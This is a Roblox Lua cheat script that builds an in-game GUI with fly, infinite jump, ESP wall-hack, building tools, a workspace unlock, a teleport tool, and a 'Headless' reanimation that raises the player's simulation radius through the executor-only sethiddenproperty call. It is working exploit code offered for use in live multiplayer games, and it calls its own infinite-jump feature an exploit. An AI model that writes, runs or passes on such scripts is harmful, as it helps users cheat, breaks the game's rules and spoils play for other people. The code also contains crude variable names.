
local ScreenGui = Instance.new("ScreenGui")
local GUI = Instance.new("Frame")
local FlyBtn = Instance.new("TextButton")
local NoClipBtn = Instance.new("TextButton")
local ESPBtn = Instance.new("TextButton")
local MainLabel = Instance.new("TextLabel")
local ToolsLabel = Instance.new("TextLabel")
local Btools = Instance.new("TextButton")
local UnlockWS = Instance.new("TextButton")
local TpTool = Instance.new("TextButton")
local ClientLabel = Instance.new("TextLabel")
local NoClipBtn_2 = Instance.new("TextButton")
local NoClipBtn_3 = Instance.new("TextButton")
local NoClipBtn_4 = Instance.new("TextButton")
local CloseGUI = Instance.new("TextButton")
local OpenGUI = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

GUI.Name = "GUI"
GUI.Parent = ScreenGui
GUI.BackgroundColor3 = Color3.fromRGB(5, 55, 90)
GUI.Position = UDim2.new(0.229078084, 0, -0.787187576, 0)
GUI.Size = UDim2.new(-2, 535, -2, 629)
GUI.Active = true
GUI.Draggable = true

FlyBtn.Name = "FlyBtn"
FlyBtn.Parent = GUI
FlyBtn.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
FlyBtn.Position = UDim2.new(0.722803712, 0, 0.165156335, 0)
FlyBtn.Size = UDim2.new(0, 89, 0, 50)
FlyBtn.Font = Enum.Font.SourceSans
FlyBtn.Text = "Fly"
FlyBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
FlyBtn.TextSize = 14.000
FlyBtn.MouseButton1Down:Connect(function()
	repeat wait()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
	local mouse = game.Players.LocalPlayer:GetMouse()


	repeat wait() until mouse


	local plr = game.Players.LocalPlayer
	local torso = plr.Character.Torso
	local flying = true
	local deb = true
	local ctrl = {f = 0, b = 0, l = 0, r = 0}
	local lastctrl = {f = 0, b = 0, l = 0, r = 0}
	local maxspeed = 50
	local speed = 0
	local bg = nil
	local bv = nil


	function Fly()
		game.StarterGui:SetCore("SendNotification", {Title="Fly Activated"; Text="press E to Deactivate"; Duration=2;})
		bg = Instance.new("BodyGyro", torso)
		bg.P = 9e4
		bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		bg.cframe = torso.CFrame
		bv = Instance.new("BodyVelocity", torso)
		bv.velocity = Vector3.new(0,0.1,0)
		bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
		repeat wait()
			plr.Character.Humanoid.PlatformStand = true
			if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
				speed = speed+.5+(speed/maxspeed)
				if speed > maxspeed then
					speed = maxspeed
				end
			elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
				speed = speed-1
				if speed < 0 then
					speed = 0
				end
			end
			if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
				lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
			elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bg = nil
		bv:Destroy()
		bv = nil
		plr.Character.Humanoid.PlatformStand = false
		game.StarterGui:SetCore("SendNotification", {Title="Fly Deactivated"; Text="press E to activeate!"; Duration=2;})
	end

	--Controls
	mouse.KeyDown:connect(function(key)
		if key:lower() == "e" then
			if flying then 
				flying = false
			else
				flying = true
				Fly()
			end
		elseif key:lower() == "w" then
			ctrl.f = 1
		elseif key:lower() == "s" then
			ctrl.b = -1
		elseif key:lower() == "a" then
			ctrl.l = -1
		elseif key:lower() == "d" then
			ctrl.r = 1
		end
	end)

	mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
			ctrl.f = 0
		elseif key:lower() == "s" then
			ctrl.b = 0
		elseif key:lower() == "a" then
			ctrl.l = 0
		elseif key:lower() == "d" then
			ctrl.r = 0
		end
	end)

	Fly()
	
	
	
	
	
	
	
end)

NoClipBtn.Name = "NoClipBtn"
NoClipBtn.Parent = GUI
NoClipBtn.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
NoClipBtn.BorderColor3 = Color3.fromRGB(98, 96, 95)
NoClipBtn.Position = UDim2.new(0.414392501, 0, 0.165156335, 0)
NoClipBtn.Size = UDim2.new(0, 89, 0, 50)
NoClipBtn.Font = Enum.Font.SourceSans
NoClipBtn.Text = "infinity jump"
NoClipBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
NoClipBtn.TextSize = 14.000
NoClipBtn.MouseButton1Down:Connect(function()

_G.infinjump = not _G.infinjump

if _G.infinJumpStarted == nil then
	
	_G.infinJumpStarted = true
	
	
	game.StarterGui:SetCore("SendNotification", {Title="Infinite Jump"; Text="The Infinite Jump exploit is ready!"; Duration=5;})

	
	local plr = game:GetService('Players').LocalPlayer
	local m = plr:GetMouse()
	m.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
			humanoid = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
			humanoid:ChangeState('Jumping')
			wait()
			humanoid:ChangeState('Seated')
			end
		end
	end)
end

        end)

ESPBtn.Name = "ESPBtn"
ESPBtn.Parent = GUI
ESPBtn.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
ESPBtn.Position = UDim2.new(0.0816822574, 0, 0.165156335, 0)
ESPBtn.Size = UDim2.new(0, 89, 0, 50)
ESPBtn.Font = Enum.Font.SourceSans
ESPBtn.Text = "ESP"
ESPBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ESPBtn.TextSize = 14.000
ESPBtn.MouseButton1Down:Connect(function()
	
	local color = BrickColor.new(50,0,250)
	local transparency = .8

	local Players = game:GetService("Players")
	local function _ESP(c)
		repeat wait() until c.PrimaryPart ~= nil
		for i,p in pairs(c:GetChildren()) do
			if p.ClassName == "Part" or p.ClassName == "MeshPart" then
				if p:FindFirstChild("shit") then p.shit:Destroy() end
				local a = Instance.new("BoxHandleAdornment",p)
				a.Name = "shit"
				a.Size = p.Size
				a.Color = color
				a.Transparency = transparency
				a.AlwaysOnTop = true    
				a.Visible = true    
				a.Adornee = p
				a.ZIndex = true    

			end
		end
	end
	local function ESP()
		for i,v in pairs(Players:GetChildren()) do
			if v ~= game.Players.LocalPlayer then
				if v.Character then
					_ESP(v.Character)
				end
				v.CharacterAdded:Connect(function(chr)
					_ESP(chr)
				end)
			end
		end
		Players.PlayerAdded:Connect(function(player)
			player.CharacterAdded:Connect(function(chr)
				_ESP(chr)
			end)  
		end)
	end
	ESP()
	
	
	
end)

MainLabel.Name = "MainLabel"
MainLabel.Parent = GUI
MainLabel.BackgroundColor3 = Color3.fromRGB(28, 121, 252)
MainLabel.Position = UDim2.new(-0.00186915894, 0, 0, 0)
MainLabel.Size = UDim2.new(0, 535, 0, 50)
MainLabel.Font = Enum.Font.SourceSansBold
MainLabel.Text = "Main"
MainLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
MainLabel.TextSize = 60.000

ToolsLabel.Name = "ToolsLabel"
ToolsLabel.Parent = GUI
ToolsLabel.BackgroundColor3 = Color3.fromRGB(28, 121, 252)
ToolsLabel.Position = UDim2.new(-0.00186915894, 0, 0.334181219, 0)
ToolsLabel.Size = UDim2.new(0, 534, 0, 50)
ToolsLabel.Font = Enum.Font.SourceSansBold
ToolsLabel.Text = "Tools"
ToolsLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
ToolsLabel.TextSize = 50.000

Btools.Name = "Btools"
Btools.Parent = GUI
Btools.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
Btools.Position = UDim2.new(0.0816822648, 0, 0.497085333, 0)
Btools.Size = UDim2.new(0, 89, 0, 50)
Btools.Font = Enum.Font.SourceSans
Btools.Text = "Btools"
Btools.TextColor3 = Color3.fromRGB(0, 0, 0)
Btools.TextSize = 14.000
Btools.MouseButton1Down:Connect(function()
	


	backpack = game:GetService("Players").LocalPlayer.Backpack

	hammer = Instance.new("HopperBin")
	hammer.Name = "Hammer"
	hammer.BinType = 4
	hammer.Parent = backpack

	cloneTool = Instance.new("HopperBin")
	cloneTool.Name = "Clone"
	cloneTool.BinType = 3
	cloneTool.Parent = backpack

	grabTool = Instance.new("HopperBin")
	grabTool.Name = "Grab"
	grabTool.BinType = 2
	grabTool.Parent = backpack
	
	
	
end)


UnlockWS.Name = "UnlockWS"
UnlockWS.Parent = GUI
UnlockWS.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
UnlockWS.Position = UDim2.new(0.722803771, 0, 0.497085333, 0)
UnlockWS.Size = UDim2.new(0, 89, 0, 50)
UnlockWS.Font = Enum.Font.SourceSans
UnlockWS.Text = "Unlock workspace"
UnlockWS.TextColor3 = Color3.fromRGB(0, 0, 0)
UnlockWS.TextSize = 14.000
UnlockWS.MouseButton1Down:Connect(function()


function Traverse(instance)
	for i,v in pairs (instance:GetChildren()) do
		
		if v:IsA("BasePart") then
			v.Locked = false
		end
		
		if #v:GetChildren() > 0 then
			Traverse(v)
		end
	end
end

Traverse(workspace)





        end)

TpTool.Name = "TpTool"
TpTool.Parent = GUI
TpTool.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
TpTool.Position = UDim2.new(0.414392531, 0, 0.497085333, 0)
TpTool.Size = UDim2.new(0, 89, 0, 50)
TpTool.Font = Enum.Font.SourceSans
TpTool.Text = "Tp tool"
TpTool.TextColor3 = Color3.fromRGB(0, 0, 0)
TpTool.TextSize = 14.000
TpTool.MouseButton1Down:Connect(function()

mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Tp tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack

end)

ClientLabel.Name = "ClientLabel"
ClientLabel.Parent = GUI
ClientLabel.BackgroundColor3 = Color3.fromRGB(28, 121, 252)
ClientLabel.Position = UDim2.new(0.00186915894, 0, 0.667196631, 0)
ClientLabel.Size = UDim2.new(0, 534, 0, 50)
ClientLabel.Font = Enum.Font.SourceSansBold
ClientLabel.Text = "Client"
ClientLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
ClientLabel.TextSize = 50.000

NoClipBtn_2.Name = "NoClipBtn"
NoClipBtn_2.Parent = GUI
NoClipBtn_2.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
NoClipBtn_2.BorderColor3 = Color3.fromRGB(98, 96, 95)
NoClipBtn_2.Position = UDim2.new(0.0816822052, 0, 0.826523542, 0)
NoClipBtn_2.Size = UDim2.new(0, 89, 0, 50)
NoClipBtn_2.Font = Enum.Font.SourceSans
NoClipBtn_2.Text = "Headless"
NoClipBtn_2.TextColor3 = Color3.fromRGB(0, 0, 0)
NoClipBtn_2.TextSize = 14.000
NoClipBtn_2.MouseButton1Down:Connect(function()
---Reanimation Made By Nexo.
---Some edits made by V3RM: Gogogamer61
for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(0,35,0)
wait(0.5)
end)
end
end

Duration = 16;
game.Players.LocalPlayer.Character.Head.face:Remove()
plr = game.Players.LocalPlayer
char=game.Players.LocalPlayer.Character
ct={}
te=table.insert

HumanDied=false

for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") then 
te(ct,game:GetService("RunService").Heartbeat:connect(function()
pcall(function()
v.Velocity = Vector3.new(0,-30,0)
sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge)
sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999)
game.Players.LocalPlayer.ReplicationFocus = workspace
end)
end))
end
end

function notify(t,tex,dur)
game.StarterGui:SetCore("SendNotification", {
    Title = t; 
    Text = tex; 
    Duration = dur or 5;
})
end

local srv= game:GetService("RunService")

fl=Instance.new('Folder',char);fl.Name='CWExtra'

char.Archivable = true
local reanim = char:Clone()
reanim.Name='N'

for i,v in next, reanim:GetDescendants() do
if v:IsA('BasePart') or v:IsA('Decal') then
v.Transparency = 1 
end 
end

--flinge = false

penis=5.65
plr.Character=nil
plr.Character=char
char.Humanoid.AutoRotate=false
char.Humanoid.WalkSpeed=0
char.Humanoid.JumpPower=0
char.Torso.Anchored = true
notify('N','done '..penis..' seconds.')
wait(penis)
char.Torso.Anchored=false
notify('N','done2')
char.Humanoid.Health=0
--reanim.Humanoid.AutoRotate=false
reanim.Animate.Disabled = true
reanim.Parent = fl
reanim.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame*CFrame.new(0,5,0)

function create(part, parent, p, r)
Instance.new("Attachment",part)
Instance.new("AlignPosition",part)
Instance.new("AlignOrientation",part)
Instance.new("Attachment",parent)
part.Attachment.Name = part.Name
parent.Attachment.Name = part.Name
part.AlignPosition.Attachment0 = part[part.Name]
part.AlignOrientation.Attachment0 = part[part.Name]
part.AlignPosition.Attachment1 = parent[part.Name]
part.AlignOrientation.Attachment1 = parent[part.Name]
parent[part.Name].Position = p or Vector3.new()
part[part.Name].Orientation = r or Vector3.new()
part.AlignPosition.MaxForce = 999999999
part.AlignPosition.MaxVelocity = math.huge
part.AlignPosition.ReactionForceEnabled = false
part.AlignPosition.Responsiveness = math.huge
part.AlignOrientation.Responsiveness = math.huge
part.AlignPosition.RigidityEnabled = false
part.AlignOrientation.MaxTorque = 999999999
part.Massless=true
end

function Pos(part, parent, p)
Instance.new("Attachment",part)
Instance.new("AlignPosition",part)
Instance.new("Attachment",parent)
part.Attachment.Name = part.Name
parent.Attachment.Name = part.Name
part.AlignPosition.Attachment0 = part[part.Name]
--part.AlignOrientation.Attachment0 = part[part.Name]
part.AlignPosition.Attachment1 = parent[part.Name]
--part.AlignOrientation.Attachment1 = parent[part.Name]
parent[part.Name].Position = p or Vector3.new()
part.AlignPosition.MaxForce = 999999999
part.AlignPosition.MaxVelocity = math.huge
part.AlignPosition.ReactionForceEnabled = false
part.AlignPosition.Responsiveness = math.huge
--part.AlignOrientation.Responsiveness = math.huge
--part.AlignPosition.RigidityEnabled = false
--part.AlignOrientation.MaxTorque = 999999999
part.Massless=true
end

for i,part in next, char:GetDescendants() do
if part:IsA('BasePart') then
te(ct,srv.RenderStepped:Connect(function()
part.CanCollide=false
end))
end
end

for i,part in next, char:GetDescendants() do
if part:IsA('BasePart') then
te(ct,srv.Stepped:Connect(function()
part.CanCollide=false
end))
end
end

for i,part in next, reanim:GetDescendants() do
if part:IsA('BasePart') then
te(ct,srv.RenderStepped:Connect(function()
part.CanCollide=false
end))
end
end

for i,part in next, reanim:GetDescendants() do
if part:IsA('BasePart') then
te(ct,srv.Stepped:Connect(function()
part.CanCollide=false
end))
end
end

for i,v in next, char:GetDescendants() do
if v:IsA('Accessory') then
create(v.Handle,reanim[v.Name].Handle)
end
end

--Pos(fhrp,reanim['Torso'])
create(char['Head'],reanim['Head'])
create(char['Torso'],reanim['Torso'])
Pos(char['HumanoidRootPart'],reanim['Torso'],Vector3.new(0,0,0))
create(char['Right Arm'],reanim['Right Arm'])
create(char['Left Arm'],reanim['Left Arm'])
create(char['Right Leg'],reanim['Right Leg'])
create(char['Left Leg'],reanim['Left Leg'])

m = plr:GetMouse()

local LVecPart = Instance.new("Part", fl) LVecPart.CanCollide = false LVecPart.Transparency = 1

te(ct,srv.RenderStepped:Connect(function()
local lookVec = workspace.CurrentCamera.CFrame.lookVector
local Root = reanim["HumanoidRootPart"]
LVecPart.Position = Root.Position
LVecPart.CFrame = CFrame.new(LVecPart.Position, Vector3.new(lookVec.X * 10000, lookVec.Y, lookVec.Z * 10000))
end))

wdown=false
sdown=false
adown=false
ddown=false
spacedown=false

te(ct,m.Button1Down:Connect(function()
click=true
end))

te(ct,m.Button1Up:Connect(function()
click=false
end))

te(ct,m.KeyDown:Connect(function(e)
if e ==' ' then
spacedown=true end
if e =='w' then
wdown=true end
if e =='s' then
sdown=true end
if e =='a' then
adown=true end
if e =='d' then
ddown=true
end
end))

te(ct,m.KeyUp:Connect(function(e)
if e ==' ' then
spacedown=false end
if e =='w' then
wdown=false end
if e =='s' then
sdown=false end
if e =='a' then
adown=false end
if e =='d' then
ddown=false
end
end))

local function MoveClone(X,Y,Z)
LVecPart.CFrame = LVecPart.CFrame * CFrame.new(-X,Y,-Z)
reanim.Humanoid.WalkToPoint = LVecPart.Position
end

te(ct,srv.RenderStepped:Connect(function()
if wdown==true then
MoveClone(0,0,1e4) end
if sdown==true then
MoveClone(0,0,-1e4) end
if adown==true then
MoveClone(1e4,0,0) end
if ddown==true then
MoveClone(-1e4,0,0)
end
if spacedown==true then
reanim.Humanoid.Jump=true end
if wdown ~= true and adown ~= true and sdown ~= true and ddown ~= true then
reanim.Humanoid.WalkToPoint = reanim.HumanoidRootPart.Position end
end))

--reanim.HumanoidRootPart.RootJoint.Part1=nil

workspace.CurrentCamera.CameraSubject = reanim.Humanoid

reset=Instance.new('BindableEvent')
te(ct,reset.Event:Connect(function()
reanim:Destroy()
HumanDied=true
reanimated=false
for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then v.Anchored=true end end
hc=char.Humanoid:Clone()
char.Humanoid:Destroy()
hc.Parent=char
game.Players:Chat('-re')
for i,v in pairs(ct) do v:Disconnect() end
game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
reset:Remove()
end))

game:GetService("StarterGui"):SetCore("ResetButtonCallback", reset)

IT = Instance.new
CF = CFrame.new
VT = Vector3.new
RAD = math.rad
C3 = Color3.new
UD2 = UDim2.new
BRICKC = BrickColor.new
ANGLES = CFrame.Angles
EULER = CFrame.fromEulerAnglesXYZ
COS = math.cos
ACOS = math.acos
SIN = math.sin
ASIN = math.asin
ABS = math.abs
MRANDOM = math.random
FLOOR = math.floor

speed = 1
sine = 1
srv = game:GetService('RunService')

function hatset(yes,part,c1,c0,nm)
reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
if nm==true then
noplsmesh(yes)
end
end

--put the hat script converted below

reanim = game.Players.LocalPlayer.Character.CWExtra.N
RJ = reanim.HumanoidRootPart.RootJoint
RS = reanim.Torso['Right Shoulder']
LS = reanim.Torso['Left Shoulder']
RH = reanim.Torso['Right Hip']
LH = reanim.Torso['Left Hip']
Root = reanim.HumanoidRootPart
NECK = reanim.Torso.Neck
NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

Mode='1'

mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
if k == '1' then-- first mode
Mode='1'
elseif k == '2' then-- second mode
Mode='2'
end
end)

coroutine.wrap(function()
while true do -- anim changer
if HumanDied then mousechanger:Disconnect() break end
sine = sine + speed
local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
if lookvector > reanim.Humanoid.WalkSpeed then
lookvector = reanim.Humanoid.WalkSpeed
end
if lookvector < -reanim.Humanoid.WalkSpeed then
lookvector = -reanim.Humanoid.WalkSpeed
end
if rightvector > reanim.Humanoid.WalkSpeed then
rightvector = reanim.Humanoid.WalkSpeed
end
if rightvector < -reanim.Humanoid.WalkSpeed then
rightvector = -reanim.Humanoid.WalkSpeed
end
local lookvel = lookvector / reanim.Humanoid.WalkSpeed
local rightvel = rightvector / reanim.Humanoid.WalkSpeed
if Mode == '1' then
if Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),-20+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
--idle clerp here
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),-20+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+36*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-36*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-36*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+36*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
--walk clerp here
elseif Root.Velocity.Magnitude > 20 then -- run
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),-20+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--run clerp here
end
elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--jump clerp here
elseif Root.Velocity.y < -1 then -- fall
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--fall clerp here
elseif Root.Velocity.Magnitude < 2 then -- idle
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--idle clerp here
elseif Root.Velocity.Magnitude < 20 then -- walk
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--walk clerp here
elseif Root.Velocity.Magnitude > 20 then -- run
NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)

--run clerp here
end
end
srv.RenderStepped:Wait()
end
end)()
--Created using Nexo Animator
end)


NoClipBtn_3.Name = "NoClipBtn"
NoClipBtn_3.Parent = GUI
NoClipBtn_3.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
NoClipBtn_3.BorderColor3 = Color3.fromRGB(98, 96, 95)
NoClipBtn_3.Position = UDim2.new(0.722803712, 0, 0.826523542, 0)
NoClipBtn_3.Size = UDim2.new(0, 89, 0, 50)
NoClipBtn_3.Font = Enum.Font.SourceSans
NoClipBtn_3.Text = "Legless?"
NoClipBtn_3.TextColor3 = Color3.fromRGB(0, 0, 0)
NoClipBtn_3.TextSize = 14.000
NoClipBtn_3.MouseButton1Down:Connect(function()


character = game:GetService("Players").LocalPlayer.Character


leftLeg = character:FindFirstChild("Left Leg")
if leftLeg then leftLeg:Destroy() end
rightLeg = character:FindFirstChild("Right Leg")
if rightLeg then rightLeg:Destroy() end


leftUpperLeg = character:FindFirstChild("LeftUpperLeg")
if leftUpperLeg then leftUpperLeg:Destroy() end
leftLowerLeg = character:FindFirstChild("LeftLowerLeg")
if leftLowerLeg then leftLowerLeg:Destroy() end
leftFoot = character:FindFirstChild("LeftFoot")
if leftFoot then leftFoot:Destroy() end
rightUpperLeg = character:FindFirstChild("RightUpperLeg")
if rightUpperLeg then rightUpperLeg:Destroy() end
rightLowerLeg = character:FindFirstChild("RightLowerLeg")
if rightLowerLeg then rightLowerLeg:Destroy() end
rightFoot = character:FindFirstChild("RightFoot")
if rightFoot then rightFoot:Destroy() end
end)

NoClipBtn_4.Name = "NoClipBtn"
NoClipBtn_4.Parent = GUI
NoClipBtn_4.BackgroundColor3 = Color3.fromRGB(28, 193, 252)
NoClipBtn_4.BorderColor3 = Color3.fromRGB(98, 96, 95)
NoClipBtn_4.Position = UDim2.new(0.414392501, 0, 0.826523542, 0)
NoClipBtn_4.Size = UDim2.new(0, 89, 0, 50)
NoClipBtn_4.Font = Enum.Font.SourceSans
NoClipBtn_4.Text = "Korblox"
NoClipBtn_4.TextColor3 = Color3.fromRGB(0, 0, 0)
NoClipBtn_4.TextSize = 14.000
